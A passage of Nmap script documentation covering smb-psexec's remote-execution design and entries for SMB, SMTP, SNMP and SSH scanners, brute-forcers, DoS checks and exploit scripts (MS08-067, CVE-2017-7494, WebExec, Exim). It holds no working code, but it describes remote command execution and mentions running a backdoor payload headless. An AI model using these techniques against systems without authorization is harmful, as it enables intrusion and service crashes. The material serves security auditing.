                        to be in <code>nselib/data/psexec</code>.
  * <code>name</code> (string) The name to display above the output. If this
                      isn't given, <code>program</code> .. <code>args</code>
                      are used.
  * <code>program</code> (string) If <code>upload</code> is false, the name
                         (fully qualified or relative) of the program on the
                         remote system; if <code>upload</code> is true, the
                         name of the local file that will be uploaded (stored
                         in <code>nselib/data/psexec</code>).
  * <code>args</code> (string) Arguments to pass to the process.
  * <code>env</code> (string) Environmental variables to pass to the process,
                     as name=value pairs, delimited, per Microsoft's spec, by
                     NULL characters (<code>string.char(0)</code>).
  * <code>maxtime</code> (integer) The approximate amount of time to wait for
                         this process to complete. The total timeout for the
                         script before it gives up waiting for a response is
                         the total of all <code>maxtime</code> fields.
  * <code>extrafiles</code> (string[]) Extra file(s) to upload before running
                            the program. These will not be renamed (because,
                            presumably, if they are then the program won't be
                            able to find them), but they will be marked as
                            hidden/system/etc. This may cause a race condition
                            if multiple people are doing this at once, but
                            there isn't much we can do. The files are also
                            deleted afterwards as tempfiles would be. The
                            files have to be in the same directory as programs
                            (<code>nselib/data/psexec</code>), but the program
                            doesn't necessarily need to be an uploaded one.
  * <code>tempfiles</code> (string[]) A list of temporary files that the
                           process is known to create (if the process does
                           create files, using this field is recommended
                           because it helps avoid making a mess on the remote
                           system).
  * <code>find</code> (string[]) Only display lines that contain the given
                      string(s) (for example, if you're searching for a line
                      that contains "IP Address", set this to <code>{'IP
                      Address'}</code>. This allows Lua-style patterns, see:
                      http://lua-users.org/wiki/PatternsTutorial (don't forget
                      to escape special characters with a <code>%</code>).
                      Note that this is client-side only; the full output is
                      still returned, the rest is removed while displaying.
                      The line of output only needs to match one of the
                      strings given here.
  * <code>remove</code> (string[]) Opposite of <code>find</code>; this removes
                        lines containing the given string(s) instead of
                        displaying them. Like <code>find</code>, this is
                        client-side only and uses Lua-style patterns. If
                        <code>remove</code> and <code>find</code> are in
                        conflict, then <code>remove</code> takes priority.
  * <code>noblank</code> (boolean) Setting this to true removes all blank
                         lines from the output.
  * <code>replace</code> (table) A table of values to replace in the strings
                         returned. Like <code>find</code> and
                         <code>replace</code>, this is client-side only and
                         uses Lua-style patterns.
  * <code>headless</code> (boolean) If <code>headless</code> is set to true,
                          the program doesn't return any output; rather, it
                          runs detached from the service so that, when the
                          service ends, the program keeps going. This can be
                          useful for, say, a monitoring program. Or a
                          backdoor, if that's what you're into (a Metasploit
                          payload should work nicely). Not compatible with:
                          <code>find</code>, <code>remove</code>,
                          <code>noblank</code>, <code>replace</code>,
                          <code>maxtime</code>, <code>outfile</code>.
  * <code>enabled</code> (boolean) Set to false, and optionally set
                         <code>disabled_message</code>, if you don't want a
                         module to run.  Alternatively, you can comment out
                         the process.
  * <code>disabled_message</code> (string) Displayed if the module is disabled.
  * <code>url</code> (string) A module where the user can download the
                     uploadable file. Displayed if the uploadable file is
                     missing.
  * <code>outfile</code> (string) If set, the specified file will be returned
                         instead of stdout.
  * <code>req_args</code> (string[]) An array of arguments that the user must
                          set in <code>--script-args</code>.


  Any field in the configuration file can contain variables, as discussed.
  Here are some of the available built-in variables:

  * <code>$lhost</code>: local IP address as a string.
  * <code>$lport</code>: local port (meaningless; it'll change by the time the
                         module is uploaded since multiple connections are
                         made).
  * <code>$rhost</code>: remote IP address as a string.
  * <code>$rport</code>: remote port.
  * <code>$lmac</code>: local MAC address as a string in the
                        xx:xx:xx:xx:xx:xx format (note: requires root).
  * <code>$path</code>: the path where the file will be uploaded to.
  * <code>$service_name</code>: the name of the service that will be running
                                this program
  * <code>$service_file</code>: the name of the executable file for the
                                service
  * <code>$temp_output_file</code>: The (ciphered) file where the programs'
                                    output will be written before being
                                    renamed to $output_file
  * <code>$output_file</code>: The final name of the (ciphered) output file.
                               When this file appears, the script downloads it
                               and stops the service
  * <code>$timeout</code>: The total amount of time the script is going to run
                           before it gives up and stops the process
  * <code>$share</code>: The share that everything was uploaded to
  * (script args): Any value passed as a script argument will be replaced (for
                   example, if Nmap is run with
                   <code>--script-args=var3=10</code>, then <code>$var3</code>
                   in any field will be replaced with <code>10</code>. See the
                   <code>req_args</code> field above. Script argument values
                   take priority over config values.

  In addition to modules, the configuration file can also contain overrides.
  Most of these aren't useful, so I'm not going to go into great detail.
  Search <code>smb-psexec.nse</code> for any reference to the
  <code>config</code> table; any value in the <code>config</code> table can be
  overridden with the <code>overrides</code> table in the module. The most
  useful value to override is probably <code>timeout</code>.

  Before and after scripts are run, and when there's an error, a cleanup is
  performed. in the cleanup, we attempt to stop the remote processes, delete
  all programs, output files, temporary files, extra files, etc. A lot of
  effort was put into proper cleanup, since making a mess on remote systems is
  a bad idea.


  Now that I've talked at length about how to use this script, I'd like to
  spend some time talking about how it works.

  Running a script happens in several stages:

  1. An open fileshare is found that we can write to. Finding an open
     fileshare basically consists of enumerating all shares and seeing which
     one(s) we have access to.
  2. A "service wrapper", and all of the uploadable/extra files, are uploaded.
     Before they're uploaded, the name of each file is obfuscated. The
     obfuscation completely renames the file, is unique for each source system,
     and doesn't change between multiple runs. This obfuscation has the benefit
     of preventing filenames from overlapping if multiple people are running this
     against the same computer, and also makes it more difficult to determine
     their purposes. The reason for keeping them consistent for every run is to
     make cleanup possible: a random filename, if the script somehow fails, will
     be left on the system.
  3. A new service is created and started. The new service has a random name
     for the same reason the files do, and points at the 'service wrapper'
     program that was uploaded.
  4. The service runs the processes. One by one, the processes are run and
     their output is captured. The output is obfuscated using a simple (and
     highly insecure) xor algorithm, which is designed to prevent casual sniffing
     (but won't deter intelligent attackers).  This data is put into a temporary
     output file. When all the programs have finished, the file is renamed to the
     final output file
  5. The output file is downloaded, and the cleanup is performced. The file
     being renamed triggers the final stage of the program, where the data is
     downloaded and all relevant files are deleted.
  6. Output file, now decrypted, is formatted and displayed to the user.

  And that's how it works!

  Please post any questions, or suggestions for better modules, to
  dev@nmap.org.

  And, as usual, since this tool can be dangerous and can easily be viewed as
  a malicious tool -- use this responsibly, and don't break any laws with it.

  Some ideas for later versions (TODO):

  * Set up a better environment for scripts (<code>PATH</code>,
    <code>SystemRoot</code>, etc). Without this, a lot of programs (especially
    ones that deal with network traffic) behave oddly.
  * Abstract the code required to run remote processes so other scripts can
    use it more easily (difficult, but will ultimately be well worth it
    later).  (May actually not be possible. There is a lot of overhead and
    specialized code in this module. We'll see, though.)
  * Let user specify an output file (per-script) so they can, for example,
    download binary files (don't think it's worthwhile).
  * Consider running the external programs in parallel (not sure if the
    benefits outweigh the drawbacks).
  * Let the config request the return code from the process instead of the
    output (not sure if doing this would be worth the effort).
  * Check multiple shares in a single session to save packets (and see where
    else we can tighten up the amount of traffic).

smb-security-mode
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/smb-security-mode.html
  Returns information about the SMB security level determined by SMB.

  Here is how to interpret the output:

  * User-level authentication: Each user has a separate username/password that
    is used to log into the system. This is the default setup of pretty much
    everything these days.
  * Share-level authentication: The anonymous account should be used to log
    in, then the password is given (in plaintext) when a share is accessed.
    All users who have access to the share use this password. This was the
    original way of doing things, but isn't commonly seen, now. If a server
    uses share-level security, it is vulnerable to sniffing.
  * Challenge/response passwords supported: If enabled, the server can accept
    any type of password (plaintext, LM and NTLM, and LMv2 and NTLMv2).  If it
    isn't set, the server can only accept plaintext passwords. Most servers
    are configured to use challenge/response these days. If a server is
    configured to accept plaintext passwords, it is vulnerable to sniffing. LM
    and NTLM are fairly secure, although there are some brute-force attacks
    against them.  Additionally, LM and NTLM can fall victim to
    man-in-the-middle attacks or relay attacks (see MS08-068 or my writeup of
    it: http://www.skullsecurity.org/blog/?p=110.
  * Message signing: If required, all messages between the client and server
    must be signed by a shared key, derived from the password and the server
    challenge. If supported and not required, message signing is negotiated
    between clients and servers and used if both support and request it. By
    default, Windows clients don't sign messages, so if message signing isn't
    required by the server, messages probably won't be signed; additionally,
    if performing a man-in-the-middle attack, an attacker can negotiate no
    message signing. If message signing isn't required, the server is
    vulnerable to man-in-the-middle attacks or SMB-relay attacks.

  This script will allow you to use the <code>smb*</code> script arguments (to
  set the username and password, etc.), but it probably won't ever require
  them.

smb-server-stats
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-server-stats.html
  Attempts to grab the server's statistics over SMB and MSRPC, which uses TCP
  ports 445 or 139.

  An administrator account is required to pull these statistics on most versions
  of Windows, and Vista and above require UAC to be turned down.

  Some of the numbers returned here don't feel right to me, but they're definitely
  the numbers that Windows returns. Take the values here with a grain of salt.

  These statistics are found using a single call to a SRVSVC function,
  <code>NetServerGetStatistics</code>. This packet is parsed incorrectly by Wireshark,
  up to version 1.0.3 (and possibly higher).

smb-system-info
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-system-info.html
  Pulls back information about the remote system from the registry. Getting all
  of the information requires an administrative account, although a user account
  will still get a lot of it. Guest probably won't get any, nor will anonymous.
  This goes for all operating systems, including Windows 2000.

  Windows Vista disables remote registry access by default, so unless it was enabled,
  this script won't work.

  If you know of more information stored in the Windows registry that could be interesting,
  post a message to the nmap-dev mailing list and I (Ron Bowes) will add it to my todo list.
  Adding new checks to this is extremely easy.

  WARNING: I have experienced crashes in <code>regsvc.exe</code> while making registry calls
  against a fully patched Windows 2000 system; I've fixed the issue that caused it,
  but there's no guarantee that it (or a similar vuln in the same code) won't show
  up again. Since the process automatically restarts, it doesn't negatively impact
  the system, besides showing a message box to the user.

smb-vuln-conficker
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-conficker.html
  Detects Microsoft Windows systems infected by the Conficker worm. This check is dangerous and
  it may crash systems.

  Based loosely on the Simple Conficker Scanner, found here:
  -- http://iv.cs.uni-bonn.de/wg/cs/applications/containing-conficker/

  This check was previously part of smb-check-vulns.

smb-vuln-cve-2017-7494
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/smb-vuln-cve-2017-7494.html
  Checks if target machines are vulnerable to the arbitrary shared library load
  vulnerability CVE-2017-7494.

  Unpatched versions of Samba from 3.5.0 to 4.4.13, and versions prior to
  4.5.10 and 4.6.4 are affected by a vulnerability that allows remote code
  execution, allowing a malicious client to upload a shared library to a writable
  share, and then cause the server to load and execute it.

  The script does not scan the version numbers by default as the patches released
  for the mainstream Linux distributions do not change the version numbers.

  The script checks the preconditions for the exploit to happen:

  1)  If the argument check-version is applied, the script will ONLY check
      services running potentially vulnerable versions of Samba, and run the
      exploit against those services. This is useful if you wish to scan a
      group of hosts quickly for the vulnerability based on the version number.
      However, because of their version number, some patched versions may still
      show up as likely vulnerable. Here, we use smb.get_os(host) to do
      versioning of the Samba version and compare it to see if it is a known
      vulnerable version of Samba. Note that this check is not conclusive:
      See 2,3,4

  2)  Whether there exists writable shares for the execution of the script.
      We must be able to write to a file to the share for the exploit to
      take place. We hence enumerate the shares using
      smb.share_find_writable(host) which returns the main_name, main_path
      and a list of writable shares.

  3)  Whether the workaround (disabling of named pipes) was applied.
      When "nt pipe support = no" is configured on the host, the service
      would not be exploitable. Hence, we check whether this is configured
      on the host using smb.share_get_details(host, 'IPC$'). The error
      returned would be "NT_STATUS_ACCESS_DENIED" if the workaround is
      applied.

  4)  Whether we can invoke the payloads from the shares.
      Using payloads from Metasploit, we upload the library files to
      the writable share obtained from 2). We then make a named pipe request
      using NT_CREATE_ANDX_REQUEST to the actual local filepath and if the
      payload executes, the status return will be false. Note that only
      Linux_x86 and Linux_x64 payloads are tested in this script.

  This script is based on the metasploit module written by hdm.

  References:
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb
  * https://www.samba.org/samba/security/CVE-2017-7494.html
  * http://blog.nsfocus.net/samba-remote-code-execution-vulnerability-analysis/

smb-vuln-cve2009-3103
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-cve2009-3103.html
  Detects Microsoft Windows systems vulnerable to denial of service (CVE-2009-3103).
  This script will crash the service if it is vulnerable.

  The script performs a denial-of-service against the vulnerability disclosed in
  CVE-2009-3103. This works against Windows Vista and some versions of Windows 7,
  and causes a bluescreen if successful. The proof-of-concept code at
  http://seclists.org/fulldisclosure/2009/Sep/39 was used, with one small change.

  This check was previously part of smb-check-vulns.

smb-vuln-ms06-025
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-ms06-025.html
  Detects Microsoft Windows systems with Ras RPC service vulnerable to MS06-025.

  MS06-025 targets the <code>RasRpcSumbitRequest()</code> RPC method which is
  a part of RASRPC interface that serves as a RPC service for configuring and
  getting information from the Remote Access and Routing service. RASRPC can be
  accessed using either "\ROUTER" SMB pipe or the "\SRVSVC" SMB pipe (usually on Windows XP machines).
  This is in RPC world known as "ncan_np" RPC transport. <code>RasRpcSumbitRequest()</code>
  method is a generic method which provides different functionalities according
  to the <code>RequestBuffer</code> structure and particularly the <code>RegType</code> field within that
  structure. <code>RegType</code> field is of <code>enum ReqTypes</code> type. This enum type lists all
  the different available operation that can be performed using the <code>RasRpcSubmitRequest()</code>
  RPC method. The one particular operation that this vuln targets is the <code>REQTYPE_GETDEVCONFIG</code>
  request to get device information on the RRAS.

  This script was previously part of smb-check-vulns.

smb-vuln-ms07-029
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-ms07-029.html
  Detects Microsoft Windows systems with Dns Server RPC vulnerable to MS07-029.

  MS07-029 targets the <code>R_DnssrvQuery()</code> and <code>R_DnssrvQuery2()</code>
  RPC method which isa part of DNS Server RPC interface that serves as a RPC service
  for configuring and getting information from the DNS Server service.
  DNS Server RPC service can be accessed using "\dnsserver" SMB named pipe.
  The vulnerability is triggered when a long string is send as the "zone" parameter
  which causes the buffer overflow which crashes the service.

  This check was previously part of smb-check-vulns.

smb-vuln-ms08-067
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-ms08-067.html
  Detects Microsoft Windows systems vulnerable to the remote code execution vulnerability
  known as MS08-067. This check is dangerous and it may crash systems.

  On a fairly wide scan conducted by Brandon Enright, we determined
  that on average, a vulnerable system is more likely to crash than to survive
  the check. Out of 82 vulnerable systems, 52 crashed.
  Please consider this before running the script.

  This check was previously part of smb-check-vulns.nse.

smb-vuln-ms10-054
Categories: vuln intrusive dos
https://nmap.org/nsedoc/scripts/smb-vuln-ms10-054.html
  Tests whether target machines are vulnerable to the ms10-054 SMB remote memory
  corruption vulnerability.

  The vulnerable machine will crash with BSOD.

  The script requires at least READ access right to a share on a remote machine.
  Either with guest credentials or with specified username/password.


smb-vuln-ms10-061
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/smb-vuln-ms10-061.html
  Tests whether target machines are vulnerable to ms10-061 Printer Spooler impersonation vulnerability.

  This vulnerability was used in Stuxnet worm.  The script checks for
  the vuln in a safe way without a possibility of crashing the remote
  system as this is not a memory corruption vulnerability.  In order for
  the check to work it needs access to at least one shared printer on
  the remote system.  By default it tries to enumerate printers by using
  LANMAN API which on some systems is not available by default. In that
  case user should specify printer share name as printer script
  argument.  To find a printer share, smb-enum-shares can be used.
  Also, on some systems, accessing shares requires valid credentials
  which can be specified with smb library arguments smbuser and
  smbpassword.

  References:
    - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2729
    - http://technet.microsoft.com/en-us/security/bulletin/MS10-061
    - http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx

smb-vuln-ms17-010
Categories: vuln safe
https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html
  Attempts to detect if a Microsoft SMBv1 server is vulnerable to a remote code
   execution vulnerability (ms17-010, a.k.a. EternalBlue).
   The vulnerability is actively exploited by WannaCry and Petya ransomware and other malware.

  The script connects to the $IPC tree, executes a transaction on FID 0 and
   checks if the error "STATUS_INSUFF_SERVER_RESOURCES" is returned to
   determine if the target is not patched against ms17-010. Additionally it checks
   for known error codes returned by patched systems.

  Tested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016.

  References:
  * https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  * https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  * https://msdn.microsoft.com/en-us/library/ee441489.aspx
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
  * https://github.com/cldrn/nmap-nse-scripts/wiki/Notes-about-smb-vuln-ms17-010

smb-vuln-regsvc-dos
Categories: intrusive exploit dos vuln
https://nmap.org/nsedoc/scripts/smb-vuln-regsvc-dos.html
  Checks if a Microsoft Windows 2000 system is vulnerable to a crash in regsvc caused by a null pointer
  dereference. This check will crash the service if it is vulnerable and requires a guest account or
  higher to work.

  The vulnerability was discovered by Ron Bowes while working on <code>smb-enum-sessions</code> and
  was reported to Microsoft (Case #MSRC8742).

  This check was previously part of smb-check-vulns.

smb-vuln-webexec
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/smb-vuln-webexec.html
  Checks whether the WebExService is installed and allows us to run code.

  Note: Requires a user account (local or domain).

  References:
  * https://www.webexec.org
  * https://blog.skullsecurity.org/2018/technical-rundown-of-webexec
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15442

smb-webexec-exploit
Categories: intrusive exploit
https://nmap.org/nsedoc/scripts/smb-webexec-exploit.html
  Attempts to run a command via WebExService, using the WebExec vulnerability.
  Given a Windows account (local or domain), this will start an arbitrary
  executable with SYSTEM privileges over the SMB protocol.

  The argument webexec_command will run the command directly. It may or may not
  start with a GUI. webexec_gui_command will always start with a GUI, and is
  useful for running commands such as "cmd.exe" as SYSTEM if you have access.

  References:
  * https://www.webexec.org
  * https://blog.skullsecurity.org/2018/technical-rundown-of-webexec

smb2-capabilities
Categories: safe discovery
https://nmap.org/nsedoc/scripts/smb2-capabilities.html
  Attempts to list the supported capabilities in a SMBv2 server for each
   enabled dialect.

  The script sends a SMB2_COM_NEGOTIATE command and parses the response
   using the SMB dialects:
  * 2.0.2
  * 2.1
  * 3.0
  * 3.0.2
  * 3.1.1

  References:
  * https://msdn.microsoft.com/en-us/library/cc246561.aspx

smb2-security-mode
Categories: safe discovery default
https://nmap.org/nsedoc/scripts/smb2-security-mode.html
  Determines the message signing configuration in SMBv2 servers
   for all supported dialects.

  The script sends a SMB2_COM_NEGOTIATE request for each SMB2/SMB3 dialect
   and parses the security mode field to determine the message signing
   configuration of the SMB server.

  References:
  * https://msdn.microsoft.com/en-us/library/cc246561.aspx

smb2-time
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/smb2-time.html
  Attempts to obtain the current system date and the start date of a SMB2 server.

smb2-vuln-uptime
Categories: vuln safe
https://nmap.org/nsedoc/scripts/smb2-vuln-uptime.html
  Attempts to detect missing patches in Windows systems by checking the
  uptime returned during the SMB2 protocol negotiation.

  SMB2 protocol negotiation response returns the system boot time
   pre-authentication. This information can be used to determine
   if a system is missing critical patches without triggering IDS/IPS/AVs.

  Remember that a rebooted system may still be vulnerable. This check
  only reveals unpatched systems based on the uptime, no additional probes are sent.

  References:
  * https://twitter.com/breakersall/status/880496571581857793

smtp-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/smtp-brute.html
  Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.

smtp-commands
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/smtp-commands.html
  Attempts to use EHLO and HELP to gather the Extended commands supported by an
  SMTP server.

smtp-enum-users
Categories: auth external intrusive
https://nmap.org/nsedoc/scripts/smtp-enum-users.html
  Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO
  commands. The goal of this script is to discover all the user accounts in the remote
  system.

  The script will output the list of user names that were found. The script will stop
  querying the SMTP server if authentication is enforced. If an error occurs while testing
  the target host, the error will be printed with the list of any combinations that were
  found prior to the error.

  The user can specify which methods to use and in which order. The script will ignore
  repeated methods. If not specified the script will use the RCPT first, then VRFY and EXPN.
  An example of how to specify the methods to use and the order is the following:

  <code>smtp-enum-users.methods={EXPN,RCPT,VRFY}</code>

smtp-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/smtp-ntlm-info.html
  This script enumerates information from remote SMTP services with NTLM
  authentication enabled.

  Sending a SMTP NTLM authentication request with null credentials will
  cause the remote service to respond with a NTLMSSP message disclosing
  information to include NetBIOS, DNS, and OS build version.

smtp-open-relay
Categories: discovery intrusive external
https://nmap.org/nsedoc/scripts/smtp-open-relay.html
  Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal
  of this script is to tell if a SMTP server is vulnerable to mail relaying.

  An SMTP server that works as an open relay, is a email server that does not verify if the
  user is authorised to send email from the specified email address. Therefore, users would
  be able to send email originating from any third-party email address that they want.

  The checks are done based in combinations of MAIL FROM and RCPT TO commands. The list is
  hardcoded in the source file. The script will output all the working combinations that the
  server allows if nmap is in verbose mode otherwise the script will print the number of
  successful tests. The script will not output if the server requires authentication.

  If debug is enabled and an error occurs while testing the target host, the error will be
  printed with the list of any combinations that were found prior to the error.

smtp-strangeport
Categories: malware safe
https://nmap.org/nsedoc/scripts/smtp-strangeport.html
  Checks if SMTP is running on a non-standard port.

  This may indicate that crackers or script kiddies have set up a backdoor on the
  system to send spam or control the machine.

smtp-vuln-cve2010-4344
Categories: exploit intrusive vuln
https://nmap.org/nsedoc/scripts/smtp-vuln-cve2010-4344.html
  Checks for and/or exploits a heap overflow within versions of Exim
  prior to version 4.69 (CVE-2010-4344) and a privilege escalation
  vulnerability in Exim 4.72 and prior (CVE-2010-4345).

  The heap overflow vulnerability allows remote attackers to execute
  arbitrary code with the privileges of the Exim daemon
  (CVE-2010-4344). If the exploit fails then the Exim smtpd child will
  be killed (heap corruption).

  The script also checks for a privilege escalation vulnerability that
  affects Exim version 4.72 and prior. The vulnerability allows the exim
  user to gain root privileges by specifying an alternate configuration
  file using the -C option (CVE-2010-4345).

  The <code>smtp-vuln-cve2010-4344.exploit</code> script argument will make
  the script try to exploit the vulnerabilities, by sending more than 50MB of
  data, it depends on the message size limit configuration option of the
  Exim server. If the exploit succeed the <code>exploit.cmd</code> or
  <code>smtp-vuln-cve2010-4344.cmd</code> script arguments can be used to
  run an arbitrary command on the remote system, under the
  <code>Exim</code> user privileges. If this script argument is set then it
  will enable the <code>smtp-vuln-cve2010-4344.exploit</code> argument.

  To get the appropriate debug messages for this script, please use -d2.

  Some of the logic of this script is based on the metasploit
  exim4_string_format exploit.
  * http://www.metasploit.com/modules/exploit/unix/smtp/exim4_string_format

  Reference:
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4344
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4345

smtp-vuln-cve2011-1720
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/smtp-vuln-cve2011-1720.html
  Checks for a memory corruption in the Postfix SMTP server when it uses
  Cyrus SASL library authentication mechanisms (CVE-2011-1720).  This
  vulnerability can allow denial of service and possibly remote code
  execution.

  Reference:
  * http://www.postfix.org/CVE-2011-1720.html

smtp-vuln-cve2011-1764
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/smtp-vuln-cve2011-1764.html
  Checks for a format string vulnerability in the Exim SMTP server
  (version 4.70 through 4.75) with DomainKeys Identified Mail (DKIM) support
  (CVE-2011-1764).  The DKIM logging mechanism did not use format string
  specifiers when logging some parts of the DKIM-Signature header field.
  A remote attacker who is able to send emails, can exploit this vulnerability
  and execute arbitrary code with the privileges of the Exim daemon.

  Reference:
  * http://bugs.exim.org/show_bug.cgi?id=1106
  * http://thread.gmane.org/gmane.mail.exim.devel/4946
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2011-1764
  * http://en.wikipedia.org/wiki/DomainKeys_Identified_Mail

sniffer-detect
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/sniffer-detect.html
  Checks if a target on a local Ethernet has its network card in promiscuous mode.

  The techniques used are described at
  http://www.securityfriday.com/promiscuous_detection_01.pdf.

snmp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/snmp-brute.html
  Attempts to find an SNMP community string by brute force guessing.

  This script opens a sending socket and a sniffing pcap socket in parallel
  threads. The sending socket sends the SNMP probes with the community strings,
  while the pcap socket sniffs the network for an answer to the probes. If
  valid community strings are found, they are added to the creds database and
  reported in the output.

  The script takes the <code>snmp-brute.communitiesdb</code> argument that
  allows the user to define the file that contains the community strings to
  be used. If not defined, the default wordlist used to bruteforce the SNMP
  community strings is <code>nselib/data/snmpcommunities.lst</code>. In case
  this wordlist does not exist, the script falls back to
  <code>nselib/data/passwords.lst</code>

  No output is reported if no valid account is found.

snmp-hh3c-logins
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-hh3c-logins.html
  Attempts to enumerate Huawei / HP/H3C Locally Defined Users through the
  hh3c-user.mib OID

  For devices running software released pre-Oct 2012 only an SNMP read-only
  string is required to access the OID. Otherwise a read-write string is
  required.

  Output is 'username - password - level: {0|1|2|3}'

  Password may be in cleartext, ciphertext or sha256
  Levels are from 0 to 3 with 0 being the lowest security level

  https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03515685
  http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html

snmp-info
Categories: default version safe
https://nmap.org/nsedoc/scripts/snmp-info.html
  Extracts basic information from an SNMPv3 GET request. The same probe is used
  here as in the service version detection scan.

snmp-interfaces
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-interfaces.html
  Attempts to enumerate network interfaces through SNMP.

  This script can also be run during Nmap's pre-scanning phase and can
  attempt to add the SNMP server's interface addresses to the target
  list.  The script argument <code>snmp-interfaces.host</code> is
  required to know what host to probe.  To specify a port for the SNMP
  server other than 161, use <code>snmp-interfaces.port</code>.  When
  run in this way, the script's output tells how many new targets were
  successfully added.

snmp-ios-config
Categories: intrusive
https://nmap.org/nsedoc/scripts/snmp-ios-config.html
  Attempts to downloads Cisco router IOS configuration files using SNMP RW (v1) and display or save them.

snmp-netstat
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-netstat.html
  Attempts to query SNMP for a netstat like output. The script can be used to
  identify and automatically add new targets to the scan by supplying the
  newtargets script argument.

snmp-processes
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-processes.html
  Attempts to enumerate running processes through SNMP.

snmp-sysdescr
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-sysdescr.html
  Attempts to extract system information from an SNMP service.

snmp-win32-services
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-win32-services.html
  Attempts to enumerate Windows services through SNMP.

snmp-win32-shares
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-win32-shares.html
  Attempts to enumerate Windows Shares through SNMP.

snmp-win32-software
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/snmp-win32-software.html
  Attempts to enumerate installed software through SNMP.

snmp-win32-users
Categories: default auth safe
https://nmap.org/nsedoc/scripts/snmp-win32-users.html
  Attempts to enumerate Windows user accounts through SNMP

socks-auth-info
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/socks-auth-info.html
  Determines the supported authentication mechanisms of a remote SOCKS
  proxy server.  Starting with SOCKS version 5 socks servers may support
  authentication.  The script checks for the following authentication
  types:
    0 - No authentication
    1 - GSSAPI
    2 - Username and password

socks-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/socks-brute.html
  Performs brute force password auditing against SOCKS 5 proxy servers.

socks-open-proxy
Categories: default discovery external safe
https://nmap.org/nsedoc/scripts/socks-open-proxy.html
  Checks if an open socks proxy is running on the target.

  The script attempts to connect to a proxy server and send socks4 and
  socks5 payloads. It is considered an open proxy if the script receives
  a Request Granted response from the target port.

  The payloads try to open a connection to www.google.com port 80.  A
  different test host can be passed as <code>proxy.url</code>
  argument.

ssh-auth-methods
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/ssh-auth-methods.html
  Returns authentication methods that a SSH server supports.

  This is in the "intrusive" category because it starts an authentication with a
  username which may be invalid. The abandoned connection will likely be logged.

ssh-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/ssh-brute.html
  Performs brute-force password guessing against ssh servers.

ssh-hostkey
Categories: safe default discovery
https://nmap.org/nsedoc/scripts/ssh-hostkey.html
  Shows SSH hostkeys.

  Shows the target SSH server's key fingerprint and (with high enough
  verbosity level) the public key itself.  It records the discovered host keys
  in <code>nmap.registry</code> for use by other scripts.  Output can be
  controlled with the <code>ssh_hostkey</code> script argument.

  You may also compare the retrieved key with the keys in your known-hosts
  file using the <code>known-hosts</code> argument.

  The script also includes a postrule that check for duplicate hosts using the
  gathered keys.

ssh-publickey-acceptance
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
  This script takes a table of paths to private keys, passphrases, and usernames
  and checks each pair to see if the target ssh server accepts them for publickey
  authentication. If no keys are given or the known-bad option is given, the
  script will check if a list of known static public keys are accepted for
  authentication.

ssh-run
Categories: intrusive
https://nmap.org/nsedoc/scripts/ssh-run.html
  Runs remote command on ssh server and returns command output.

ssh2-enum-algos
Categories: safe discovery
https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html
  Reports the number of algorithms (for encryption, compression, etc.) that
  the target SSH2 server offers. If verbosity is set, the offered algorithms
  are each listed by type.

  If the "client to server" and "server to client" algorithm lists are identical
  (order specifies preference) then the list is shown only once under a combined
  type.

sshv1
Categories: default safe
https://nmap.org/nsedoc/scripts/sshv1.html
  Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.

ssl-ccs-injection
Categories: vuln safe
https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html
  Detects whether a server is vulnerable to the SSL/TLS "CCS Injection"
